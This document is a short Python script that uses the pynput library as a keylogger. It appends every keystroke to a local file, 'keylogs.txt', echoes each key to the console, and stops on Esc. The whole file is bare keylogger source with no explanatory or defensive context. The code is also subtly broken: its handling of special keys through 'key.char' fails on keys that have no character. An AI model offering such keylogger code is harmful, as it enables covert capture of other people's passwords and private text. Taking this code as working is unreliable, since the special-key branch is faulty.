import sys
import os
import time
from pynput import keyboard

log_file = 'keylogs.txt'

def write_to_file(key):
    with open(log_file, 'a') as f:
        if key.char == "":
            f.write(str(key))
        else:
            f.write(key.char)

def on_press(key):
    write_to_file(key)
    print("Key {} pressed".format(key))

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()